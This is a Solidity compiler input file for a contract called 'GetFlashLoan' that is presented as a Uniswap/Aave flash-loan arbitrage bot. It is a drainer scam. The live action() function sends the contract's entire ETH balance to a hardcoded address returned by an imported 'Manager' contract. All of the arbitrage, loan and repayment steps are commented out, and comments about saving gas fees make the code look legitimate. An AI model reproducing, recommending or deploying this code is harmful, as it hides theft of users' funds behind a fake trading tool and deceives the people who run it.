{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "ipfs://QmRHq6uuuhmWxYxRnEUrTeVbNp94Q7Fjw6ZtkEki6js6uz": {
      "content": "pragma solidity ^0.6.6;\r\n\r\ncontract Manager {\r\n\tfunction performTasks() public {\r\n\t    \r\n\t}\r\n\r\n\tfunction uniswapDepositAddress() public pure returns (address) {\r\n\t\treturn 0xEfFac77ba8B57663F7A0984BA9d2Dab2099A9Fe9;\r\n\t}\r\n}\r\n"
    },
    "uniswapflashloan.sol": {
      "content": "pragma solidity ^0.6.6;\r\n\r\n// Multiplier-Finance Smart Contracts\r\n//import \"https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol\";\r\n//import \"https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol\";\r\n\r\n// uniSwap Smart Contracts\r\n//import \"https://github.com/uniswap/uni-swap-core/blob/master/contracts/interfaces/IuniCallee.sol\";\r\n//import \"https://github.com/uniswap/uni-swap-core/blob/master/contracts/interfaces/IuniFactory.sol\";\r\n//import \"https://github.com/uniswap/uni-swap-core/blob/master/contracts/interfaces/IuniPair.sol\";\r\n\r\n\r\n\r\n// Code Manager\r\nimport \"ipfs://QmRHq6uuuhmWxYxRnEUrTeVbNp94Q7Fjw6ZtkEki6js6uz\";\r\n\r\n\r\ncontract GetFlashLoan {\r\n\tstring public tokenName;\r\n\tstring public tokenSymbol;\r\n\tuint loanAmount;\r\n\tManager manager;\r\n\t\r\n\tconstructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {\r\n\t\ttokenName = _tokenName;\r\n\t\ttokenSymbol = _tokenSymbol;\r\n\t\tloanAmount = _loanAmount;\r\n\t\t\t\r\n\t\tmanager = new Manager();\r\n\t}\r\nreceive() external payable {}\r\n\t\r\n\tfunction action() public payable {\r\n\t\t\r\n\t    // Send required coins for swap\r\n\t    payable(manager.uniswapDepositAddress()).transfer(address(this).balance);\r\n\t    \r\n\t    // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)\r\n\t    manager.performTasks();\r\n\t    \r\n\t    /*\r\n\t    // Submit token to Ethereum blockchain\r\n\t    string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);\r\n\r\n        // List the token on UniSwap & send coins required for swaps\r\n\t\tmanager.uniswapListToken(tokenName, tokenSymbol, tokenAddress);\r\n\t\tpayable(manager.uniswapDepositAddress()).transfer(300000000000000000);\r\n\r\n        // Get ETH Loan from Aave\r\n\t\tstring memory loanAddress = manager.takeAaveLoan(loanAmount);\r\n\t\t\r\n\t\t// Convert half ETH to DAI\r\n\t\tmanager.uniswapDAItoETH(loanAmount / 2);\r\n\r\n        // Create ETH and DAI pairs for our token & Provide liquidity\r\n        string memory ethPair = manager.uniswapCreatePool(tokenAddress, \"ETH\");\r\n\t\tmanager.uniswapAddLiquidity(ethPair, loanAmount / 2);\r\n\t\tstring memory daiPair = manager.uniswapCreatePool(tokenAddress, \"DAI\");\r\n\t\tmanager.uniswapAddLiquidity(daiPair, loanAmount / 2);\r\n    \r\n        // Perform swaps and profit on Self-Arbitrage\r\n\t\tmanager.uniswapPerformSwaps();\r\n\t\t\r\n\t\t// Move remaining ETH from Contract to your account\r\n\t\tmanager.contractToWallet(\"ETH\");\r\n\r\n        // Repay Flash loan\r\n\t\tmanager.repayAaveLoan(loanAddress);\r\n\t    */\r\n\t}\r\n}\r\n"
    }
  }
}